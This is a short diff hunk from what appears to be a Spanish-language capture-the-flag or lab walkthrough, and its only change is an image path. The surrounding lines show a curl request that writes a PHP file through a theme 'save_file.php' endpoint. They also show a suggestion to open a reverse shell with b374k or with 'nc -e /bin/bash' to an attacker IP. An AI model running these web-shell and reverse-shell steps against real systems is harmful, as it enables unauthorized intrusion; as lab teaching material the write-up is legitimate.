@@ -42,7 +42,7 @@ curl '10.42.0.151/dapur/apps/app_theme/libs/save_file.php' --data 'content=<?php
 &src=upload.php'
 ```
 
-![](josie-upload.png)
+![](img/josie-upload.png)
 
 Podemos usar la opción “fácil” para hacer una shell reversa de b374k o utilizar la ejecución de comandos con `nc -e /bin/bash 10.42.0.201 8080`
 
